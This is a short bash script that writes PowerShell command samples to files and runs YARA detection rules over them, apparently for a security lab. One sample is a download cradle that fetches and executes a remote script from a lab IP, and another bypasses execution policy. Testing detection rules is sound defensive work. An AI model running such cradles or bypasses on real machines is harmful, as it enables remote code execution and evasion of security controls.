#!/bin/bash
# Creates test samples from the lab attack commands and scans them with the YARA rules.
# Install YARA first on Kali: sudo apt install yara
mkdir -p samples
cat > samples/cradle.txt << 'EOT'
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.30/test')"
EOT
cat > samples/encoded.txt << 'EOT'
powershell.exe -EncodedCommand "V3JpdGUtSG9zdCAnSGVsbG8gV29ybGQn"
EOT
cat > samples/bypass.txt << 'EOT'
powershell.exe -ExecutionPolicy Bypass -Command "Write-Host 'Testing bypass'"
EOT
cat > samples/benign.txt << 'EOT'
powershell.exe -Command "Get-Service | Where-Object Status -eq Running"
EOT
echo "Expected: cradle, encoded, bypass each match one rule. benign matches nothing."
yara -r ps_lab_detections.yar samples/
